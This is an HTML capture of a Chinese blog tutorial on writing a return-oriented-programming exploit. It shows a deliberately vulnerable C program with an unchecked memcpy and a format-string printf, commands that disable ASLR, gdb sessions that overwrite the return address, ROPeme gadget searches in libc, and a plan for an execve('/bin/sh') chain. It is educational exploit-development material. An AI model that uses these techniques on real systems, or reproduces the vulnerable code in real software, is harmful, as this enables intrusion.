<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>ROP exploit 编写 | Star</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="缓冲区溢出,ROP,exploit 编写," />
  

  <meta name="description" content="学习的过程，不仅要知其然，还要知其所以然，继前文使用ROPgadget构建gadgets链，实现ROP攻击，本文学习一步一步编写ROP exploit。">
<meta property="og:type" content="article">
<meta property="og:title" content="ROP exploit 编写">
<meta property="og:url" content="http://huirong.github.io/2016/03/11/ROP-exploit/index.html">
<meta property="og:site_name" content="Star">
<meta property="og:description" content="学习的过程，不仅要知其然，还要知其所以然，继前文使用ROPgadget构建gadgets链，实现ROP攻击，本文学习一步一步编写ROP exploit。">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCjw1f1swkqy8k3j30pw04s75o.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f27454szgfj30ks0a8gnf.jpg">
<meta property="og:updated_time" content="2016-04-23T11:14:11.327Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ROP exploit 编写">
<meta name="twitter:description" content="学习的过程，不仅要知其然，还要知其所以然，继前文使用ROPgadget构建gadgets链，实现ROP攻击，本文学习一步一步编写ROP exploit。">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/005CA6ZCjw1f1swkqy8k3j30pw04s75o.jpg">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/huirong.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/category/"
            target="_self"
            >
            分类
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            target="_self"
            >
            关于
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/search/"
            target="_self"
            >
            搜索
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅰ、ROP-和-ROP-gadget"><span class="toc-text">Ⅰ、ROP 和 ROP gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-定义"><span class="toc-text">① 定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-如何寻找-gadgets？"><span class="toc-text">② 如何寻找 gadgets？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-ROP-Gadgets-功能"><span class="toc-text">③ ROP Gadgets 功能</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅱ、ROP-exploit-的编写"><span class="toc-text">Ⅱ、ROP exploit 的编写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-初始化"><span class="toc-text">① 初始化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-自动化工具-ROPeme"><span class="toc-text">② 自动化工具 ROPeme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-查看二进制关联的-libc-库"><span class="toc-text">③ 查看二进制关联的 libc 库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅲ、ROPeme-简介"><span class="toc-text">Ⅲ、ROPeme 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-指定搜索目录"><span class="toc-text">① 指定搜索目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-查找-gadget"><span class="toc-text">② 查找 gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅳ、exploitation"><span class="toc-text">Ⅳ、exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-exploitation-组成"><span class="toc-text">① exploitation 组成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-查找对应的-ROP-gadgets，完成上述功能。"><span class="toc-text">② 查找对应的 ROP gadgets，完成上述功能。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-ROP-链如下"><span class="toc-text">③ ROP 链如下:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#④-测试一下-shellcode-正确性和实用性"><span class="toc-text">④ 测试一下 shellcode 正确性和实用性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅴ、参考文献"><span class="toc-text">Ⅴ、参考文献</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-ROP-exploit" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">ROP exploit 编写</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2016.03.11</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>star</span>
        </span>
      

      
  <span class="article-category">
    <i class="icon-list"></i>
    <a class="article-category-link" href="/categories/exploit-编写/">exploit 编写</a>
  </span>



      
        <span>
          <i class="icon-comment"></i>
          <a href="http://huirong.github.io/2016/03/11/ROP-exploit/#disqus_thread"></a>
        </span>
      

    </div>
  </header>

  <div class="article-content">
    
      <p>学习的过程，不仅要知其然，还要知其所以然，继前文<a href="http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/">使用ROPgadget构建gadgets链，实现ROP攻击</a>，本文学习一步一步编写ROP exploit。<br><a id="more"></a></p>
<h1 id="Ⅰ、ROP-和-ROP-gadget"><a href="#Ⅰ、ROP-和-ROP-gadget" class="headerlink" title="Ⅰ、ROP 和 ROP gadget"></a>Ⅰ、ROP 和 ROP gadget</h1><h2 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h2><p>ROP就是拼接目标应用程序和它所关联的库函数中已有的短指令序列，组成payload，这些短指令序列就是 gadget。ROP能成功绕过 NX/DEP(栈不可执行)。</p>
<p>ROP gadgets 是以 ret 指令结尾的连续的短指令序列。这些二进制指令序列实现一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。</p>
<p>因此可重新组合 gadgets ，达到进行任意操作的目的。</p>
<p>而为了使各个 gadgets “拼接”起来，需构造一个特殊返回栈。首先让指向构造的栈（stack）的指针跳到 gadget A中，执行其中的代码序列后ret回我们的 stack 中，然后下一步是跳到 gadget B，执行后就到 gadgets C…… 只要 stack 足够大，就能达到我们想要的效果。</p>
<h2 id="②-如何寻找-gadgets？"><a href="#②-如何寻找-gadgets？" class="headerlink" title="② 如何寻找 gadgets？"></a>② 如何寻找 gadgets？</h2><p>寻找 gadgets 算法：</p>
<ul>
<li>搜索所有的 “ret” 指令</li>
<li>向前遍历，判断 “ret” 的前几个字节是否为合法指令。保留能构成有效指令的最大字节数（20 bytes）</li>
<li>记录目标应用程序和它关联的库函数中所有的合法指令序列</li>
</ul>
<p>目前有多种自动化搜索 gadgets 工具，不用自己编写程序，下文会介绍。</p>
<h2 id="③-ROP-Gadgets-功能"><a href="#③-ROP-Gadgets-功能" class="headerlink" title="③ ROP Gadgets 功能"></a>③ ROP Gadgets 功能</h2><p><strong> （1）load 常数 到寄存器 </strong></p>
<ul>
<li>解释：将栈中存放的常数加载到指定寄存器</li>
<li><p>示例 ：POP eax;ret;<br>  将栈中的值 pop 到 eax 中，并返回栈顶存放的地址。<br>  <img src="http://ww1.sinaimg.cn/large/005CA6ZCjw1f1swkqy8k3j30pw04s75o.jpg" alt=""></p>
<p>  因此，当返回地址覆盖为 pop eax/ret 的地址，首先返回到此指令序列，将 0xdeadbeef 的值加载到 eax 中，然后 “ret” 返回到下一条 gadget。</p>
</li>
</ul>
<p><strong> （2）从内存中加载数据（load from memory） </strong></p>
<ul>
<li>示例：mov ecx,[eax];ret</li>
<li>将存在放eax中的地址指向的值，加载到 ecx 中。</li>
</ul>
<p><strong> （3）写入内存（storing into memory） </strong></p>
<ul>
<li>将寄存器中的值写入内存</li>
<li>示例：mov [eax],ecx;ret;<br>  将 ecx 中的值写入存放在 eax 地址指向的内存区。</li>
</ul>
<p><strong> （4）算术运算 </strong></p>
<ul>
<li>包括 加、减、乘、异或 or、&amp;</li>
<li>示例：add eax,0x0b;ret(eax中的值加11，在存入eax中)<br>  xor edx,edx;ret(edx清零)</li>
</ul>
<p><strong> （5）系统调用 </strong></p>
<ul>
<li>系统调用指令实现内核中断</li>
<li>示例：<ul>
<li>int 0x80;ret</li>
<li>call gs:[0x10];ret</li>
</ul>
</li>
</ul>
<p><strong> （6）尽量避免使用的gadgets </strong></p>
<ul>
<li>不要使用以 leave 结尾的gadgets，会污染栈帧</li>
<li>不要使用包含 pop ebp 的gadgets，同样也会污染栈帧</li>
</ul>
<h1 id="Ⅱ、ROP-exploit-的编写"><a href="#Ⅱ、ROP-exploit-的编写" class="headerlink" title="Ⅱ、ROP exploit 的编写"></a>Ⅱ、ROP exploit 的编写</h1><h2 id="①-初始化"><a href="#①-初始化" class="headerlink" title="① 初始化"></a>① 初始化</h2><p>有漏洞的程序如下：<br> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">	<span class="built_in">memcpy</span>(buf, argv[<span class="number">1</span>],<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</div><div class="line">	<span class="built_in">printf</span>(buf);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>禁用ASLR，然后测试程序是否正常运行。</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</div><div class="line"># gcc -mpreferred-stack-boundary=<span class="number">2</span> so3.c -o rop2</div><div class="line">so3.c: <span class="keyword">In</span> <span class="function"><span class="keyword">function</span></span> ‘main’:</div><div class="line">so3.c:<span class="number">6</span>:<span class="number">2</span>: warning: incompatible <span class="keyword">implicit</span> declaration of built-<span class="keyword">in</span> <span class="function"><span class="keyword">function</span></span> ‘memcpy’ *enabled by <span class="keyword">default</span>+</div><div class="line">so3.c:<span class="number">6</span>:<span class="number">22</span>: warning: incompatible <span class="keyword">implicit</span> declaration of built-<span class="keyword">in</span> <span class="function"><span class="keyword">function</span></span> ‘strlen’ *enabled by <span class="keyword">default</span>+</div><div class="line"># ./rop2 `python -c <span class="string">'print "A"*260'</span>`</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF􀳦􀳦􀳦</div><div class="line"># gdb -q rop2</div><div class="line">Reading symbols from /root/Desktop/tuts/so/rop2...(no debugging symbols found)...done.</div><div class="line">(gdb) r `python -c <span class="string">'print "A"*260+"B"*4'</span>`</div><div class="line">Starting <span class="function"><span class="keyword">program</span></span>: /root/Desktop/tuts/so/rop2 `python -c <span class="string">'print "A"*260+"B"*4'</span>`</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">Program</span></span> received signal SIGSEGV, Segmentation fault.</div><div class="line">x42424242 <span class="keyword">in</span> ?? ()</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>如上面所示，成功覆盖了返回地址，返回地址离shellcode起始地址 264 bytes。</p>
<h2 id="②-自动化工具-ROPeme"><a href="#②-自动化工具-ROPeme" class="headerlink" title="② 自动化工具 ROPeme"></a>② 自动化工具 ROPeme</h2><p>使用自动化搜索工具 ROPeme 查找 libc 库中的 gadgets，ROPeme <a href="https://github.com/packz/ropeme" target="_blank" rel="external">下载链接</a></p>
<p>首次使用遇到 ImportError：No module named distorm，请参考<a href="http://huirong.github.io/2016/03/11/quick-fix-on-ropeme-importError/">快速修复 ropeme ImportError：No module named distorm</a><br> 接下来，开启查找寻找 gadgets 之旅。</p>
<h2 id="③-查看二进制关联的-libc-库"><a href="#③-查看二进制关联的-libc-库" class="headerlink" title="③ 查看二进制关联的 libc 库"></a>③ 查看二进制关联的 libc 库</h2><p> 有两种方法可以查看库文件<br> <strong> 1、info files </strong><br> gdb 调试器中，在 main 函数起始处设置断点，然后运行程序，使用 “ info files” 命令查看二进制关联的库文件。</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">(gdb) b *main</div><div class="line">Breakpoint <span class="number">1</span> <span class="keyword">at</span> <span class="number">0x804847c</span></div><div class="line">(gdb) r aaaa</div><div class="line">The program being debugged has been started already.</div><div class="line">Start <span class="keyword">it</span> <span class="keyword">from</span> <span class="keyword">the</span> <span class="keyword">beginning</span>? (y <span class="keyword">or</span> n) y</div><div class="line">Starting program: /root/Desktop/tuts/so/rop2 aaaa</div><div class="line"></div><div class="line"></div><div class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804847c</span> <span class="keyword">in</span> main ()</div><div class="line">(gdb) info files</div><div class="line">Symbols <span class="keyword">from</span> <span class="string">"/root/Desktop/tuts/so/rop2"</span>.</div><div class="line">Unix child process:</div><div class="line">	Using <span class="keyword">the</span> <span class="built_in">running</span> image <span class="keyword">of</span> child process <span class="number">28344.</span></div><div class="line">	While <span class="built_in">running</span> this, GDB <span class="keyword">does</span> <span class="keyword">not</span> access memory <span class="keyword">from</span>...</div><div class="line">Local exec <span class="built_in">file</span>:</div><div class="line">	`/root/Desktop/tuts/so/rop2', <span class="built_in">file</span> type elf32-i386.</div><div class="line">	Entry point: <span class="number">0x8048390</span></div><div class="line">	<span class="number">0x08048134</span> - <span class="number">0x08048147</span> <span class="keyword">is</span> .interp</div><div class="line">	<span class="comment">---snipped</span></div><div class="line">	<span class="number">0x08049704</span> - <span class="number">0x08049708</span> <span class="keyword">is</span> .bss</div><div class="line">	<span class="number">0xb7fe2114</span> - <span class="number">0xb7fe2138</span> <span class="keyword">is</span> .note.gnu.build-<span class="built_in">id</span> <span class="keyword">in</span> /lib/ld-linux.so<span class="number">.2</span></div><div class="line">	<span class="comment">---snipped---</span></div><div class="line">	<span class="number">0xb7fc29a0</span> - <span class="number">0xb7fc5978</span> <span class="keyword">is</span> .bss <span class="keyword">in</span> /lib/i386-linux-gnu/i686/cmov/libc.so<span class="number">.6</span></div></pre></td></tr></table></figure>
<p>/lib/ld-linux.so.2 和 /lib/i386-linux-gnu/i686/cmov/libc.so.6  都是二进制文件 “rop2” 关联的库</p>
<p><strong> 2、/proc/pid/maps </strong><br> 运行程序，查看其 pid ，然后查看 maps<br> <figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">root@<span class="symbol">kali:</span>~<span class="regexp">/Desktop/tuts</span><span class="regexp">/so# ps -aux | grep rop2</span></div><div class="line">warning: bad ps syntax, perhaps a bogus '-'?</div><div class="line">See http:/<span class="regexp">/gitorious.org/procps</span><span class="regexp">/procps/blobs</span><span class="regexp">/master/</span>Documentation/FAQ</div><div class="line">root <span class="number">28117</span> <span class="number">0.0</span> <span class="number">0.3</span> <span class="number">13624</span> <span class="number">7748</span> pts/<span class="number">2</span> S+ <span class="number">15</span>:<span class="number">57</span> <span class="number">0</span>:<span class="number">00</span> gdb -q rop2</div><div class="line">root <span class="number">28119</span> <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">1704</span> <span class="number">252</span> pts/<span class="number">2</span> t <span class="number">15</span>:<span class="number">57</span> <span class="number">0</span>:<span class="number">00</span> /root/Desktop/tuts/so/rop2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">root <span class="number">28341</span> <span class="number">0.0</span> <span class="number">0.3</span> <span class="number">13548</span> <span class="number">7552</span> pts/<span class="number">6</span> S <span class="number">16</span>:<span class="number">24</span> <span class="number">0</span>:<span class="number">00</span> gdb -q rop2</div><div class="line">root <span class="number">28344</span> <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">1700</span> <span class="number">244</span> pts/<span class="number">6</span> t <span class="number">16</span>:<span class="number">24</span> <span class="number">0</span>:<span class="number">00</span> /root/Desktop/tuts/so/rop2 aaaa</div><div class="line">root <span class="number">28392</span> <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">3484</span> <span class="number">768</span> pts/<span class="number">6</span> S+ <span class="number">16</span>:<span class="number">27</span> <span class="number">0</span>:<span class="number">00</span> grep rop2</div><div class="line">root@<span class="symbol">kali:</span>~<span class="regexp">/Desktop/tuts</span><span class="regexp">/so# cat /proc</span><span class="regexp">/28119/maps</span></div><div class="line"><span class="number">08048000</span>-<span class="number">08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">548883</span> /root/Desktop/tuts/so/rop2 (deleted)</div><div class="line">---snipped---</div><div class="line">b7e63000-b7fbf000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">1311258</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">i686</span>/<span class="title">cmov</span>/<span class="title">libc</span>-2.13.<span class="title">so</span></span></div><div class="line">b7fbf000-b7fc0000 ---p <span class="number">0015</span>c000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1311258</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">i686</span>/<span class="title">cmov</span>/<span class="title">libc</span>-2.13.<span class="title">so</span></span></div><div class="line">b7fc0000-b7fc2000 r--p <span class="number">0015</span>c000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1311258</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">i686</span>/<span class="title">cmov</span>/<span class="title">libc</span>-2.13.<span class="title">so</span></span></div><div class="line">b7fc2000-b7fc3000 rw-p <span class="number">0015e000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">1311258</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">i686</span>/<span class="title">cmov</span>/<span class="title">libc</span>-2.13.<span class="title">so</span></span></div><div class="line">---snipped---</div><div class="line">b7fff000-b8000000 rw-p <span class="number">0001</span>c000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1311294</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">ld</span>-2.13.<span class="title">so</span></span></div><div class="line">bffdf000-c0000000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> [stack]</div><div class="line">b7fff000-b8000000 rw-p <span class="number">0001</span>c000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1311294</span> /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">ld</span>-2.13.<span class="title">so</span></span></div><div class="line">bffdf000-c0000000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> [stack]</div><div class="line">root@<span class="symbol">kali:</span>~<span class="regexp">/Desktop/tuts</span><span class="regexp">/so# exit</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
<p>推荐使用第二种方法，可以查看库的起始地址，后续计算 gadgets 的真实地址时要用到。</p>
<h1 id="Ⅲ、ROPeme-简介"><a href="#Ⅲ、ROPeme-简介" class="headerlink" title="Ⅲ、ROPeme 简介"></a>Ⅲ、ROPeme 简介</h1><p>首先运行，ROPeme中的脚本“ropshell.py”,然后查看帮助目录<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop/tuts/<span class="keyword">so</span>/ropeme# ./ropshell.py</div><div class="line">Simple ROP interactive <span class="keyword">shell</span>: [<span class="keyword">generate</span>, load, <span class="keyword">search</span>] gadgets</div><div class="line">ROPeMe&gt; <span class="keyword">help</span></div><div class="line">Available commands: <span class="keyword">type</span> <span class="keyword">help</span> &lt;command&gt; <span class="keyword">for</span> detail</div><div class="line"><span class="keyword">generate</span> <span class="keyword">Generate</span> ROP gadgets <span class="keyword">for</span> binary</div><div class="line">	load Load ROP gadgets from <span class="keyword">file</span></div><div class="line">	<span class="keyword">search</span> <span class="keyword">Search</span> ROP gadgets</div><div class="line">	<span class="keyword">shell</span> <span class="keyword">Run</span> external <span class="keyword">shell</span> commands</div><div class="line">	^<span class="keyword">D</span> <span class="keyword">Exit</span></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure></p>
<h2 id="①-指定搜索目录"><a href="#①-指定搜索目录" class="headerlink" title="① 指定搜索目录"></a>① 指定搜索目录</h2><p>使用 generate 函数从函数二进制文件或关联的库中查找 gadgets，我们搜索 /lib/i386-linux-gnu/i686/cmov/libc-2.13.so 4 库函数。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; generate /lib/i386-linux-gnu/i686/cmov/libc-<span class="number">2.13</span><span class="selector-class">.so</span> <span class="number">4</span></div><div class="line">Generating gadgets <span class="keyword">for</span> /lib/i386-linux-gnu/i686/cmov/libc-<span class="number">2.13</span><span class="selector-class">.so</span> with backward depth=<span class="number">4</span></div><div class="line">It may take few minutes depends on the depth and file size...</div><div class="line">Processing <span class="selector-tag">code</span> block <span class="number">1</span>/<span class="number">2</span></div><div class="line">Processing <span class="selector-tag">code</span> block <span class="number">2</span>/<span class="number">2</span></div><div class="line">Generated <span class="number">10915</span> gadgets</div><div class="line">Dumping asm gadgets to file: libc-<span class="number">2.13</span><span class="selector-class">.so</span><span class="selector-class">.ggt</span> ...</div><div class="line"></div><div class="line">OK</div><div class="line"></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure>
<p>generate 命令中紧跟在 libc-2.13.so 后的 4 代表：搜索深度。<br>最后的 OK 表示 generate 成功执行。</p>
<h2 id="②-查找-gadget"><a href="#②-查找-gadget" class="headerlink" title="② 查找 gadget"></a>② 查找 gadget</h2><p>使用 search 函数查找要使用的 gadgets。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">pop</span> ?</div><div class="line">Searching for ROP gadget: <span class="keyword">pop</span> ? with constraints: []</div><div class="line">0x29d1cL: <span class="keyword">pop</span> <span class="built_in">ds</span> <span class="comment">;;</span></div><div class="line">0x29d2fL: <span class="keyword">pop</span> <span class="built_in">ds</span> <span class="comment">;;</span></div><div class="line">0x29fd6L: <span class="keyword">pop</span> <span class="built_in">ds</span> <span class="comment">;;</span></div><div class="line">---snipped---</div><div class="line">0x387cL: <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">;;</span></div><div class="line">0x9dad0L: <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">;;</span></div><div class="line">--More-- (<span class="number">24</span>/<span class="number">28</span>)</div><div class="line">0x10eab9L: <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">;;</span></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure></p>
<p>search pop ? : 搜索所有以 ret 结束的、包含 pop 的 gadgets。<br>? 表示 pop 下一条指令为 ret。例如 复合指令 “pop ? mov ?” 表示搜索 “pop r32;mov;ret” 指令序列。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ROPeMe&gt; search <span class="keyword">pop</span> <span class="built_in">eax</span> %</div><div class="line">Searching for ROP gadget: <span class="keyword">pop</span> <span class="built_in">eax</span> % with constraints: []</div><div class="line">0x189a4L: <span class="keyword">pop</span> <span class="built_in">eax</span> <span class="comment">; add [esi] eax ; add [ebx+0x5d5b08c4] al ;;</span></div><div class="line">0x61c42L: <span class="keyword">pop</span> <span class="built_in">eax</span> <span class="comment">; mov [ecx+0xb8] edx ; pop ebx ; pop ebp ;;</span></div><div class="line">---snipped---</div><div class="line">0xd8f31L: <span class="keyword">pop</span> <span class="built_in">eax</span> <span class="comment">;;</span></div><div class="line">0xd8f52L: <span class="keyword">pop</span> <span class="built_in">eax</span> <span class="comment">;;</span></div><div class="line">ROPeMe&gt;</div></pre></td></tr></table></figure>
<p>search pop eax % : eax 指令了特定寄存器；% 表示pop eax 后的指令数任意，且 结束指令可以是 “ret/leave;ret/pop ebp;ret”</p>
<h1 id="Ⅳ、exploitation"><a href="#Ⅳ、exploitation" class="headerlink" title="Ⅳ、exploitation"></a>Ⅳ、exploitation</h1><p>接下来就是 exploitation 的功能，并具体组织 exploitation 过程。<br>我打算运行 “execve(“/bin/sh”,0,0)”;</p>
<h2 id="①-exploitation-组成"><a href="#①-exploitation-组成" class="headerlink" title="① exploitation 组成"></a>① exploitation 组成</h2><p>Linux 系统调用的参数一般存放在 ebx,ecx,edx,esi,edi 寄存器中。<br>因此参数分布存放情况</p>
<ul>
<li>ebx: string 的地址</li>
<li>ecx: argp数组的指针</li>
<li>edx: envp数组的指针</li>
<li>eax: 系统调用号<br>execve()的系统调用号是 “11” 或 “0xb”</li>
</ul>
<p>在 “/usr/include/i386-linux-gnu/asm/unistd_32.h” 中查看系统调用号。unistd_32.h 是 x86 汇编系统调用头文件。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@kali:</span>~/Desktop/tuts/so# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve</div><div class="line">#define __NR_execve <span class="number">11</span></div><div class="line">root<span class="variable">@kali</span>:~/Desktop/tuts/so#</div></pre></td></tr></table></figure>
<p>exploitation 组成</p>
<ol>
<li>eax 清零</li>
<li>move argp 数组的指针到 ecx</li>
<li>move envp 数组的指针到 ecx</li>
<li>设置 ebx 为 “/bin/sh” 的起始地址</li>
<li>move oxb into eax</li>
<li>执行系统调用</li>
</ol>
